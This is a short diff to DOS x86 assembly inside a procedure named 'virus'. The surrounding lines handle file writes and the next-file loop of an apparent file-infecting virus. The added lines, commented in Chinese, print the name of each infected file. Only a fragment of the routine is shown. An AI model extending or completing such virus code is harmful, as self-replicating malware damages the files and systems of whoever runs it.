@@ -142,7 +142,14 @@ virus proc
               mov  dx,si
               mov  cx,30h
               int  21h
-
+print_infected_file:
+           lea dx, [bp+offset dta]  ; 匹配结果再磁盘缓冲区中
+            add dx, 1eh              ; 文件名地址
+            mov ah, 09h              ; 输出字符串
+            int 21h
+            mov dl, 0dh                    ;输出回车
+            mov ah, 02h                    ;DOS功能调用：显示一个字符
+            int 21h
     next_file:
               mov  ah,3eh                      ;关闭文件,参数：BX=文件号
               int  21h
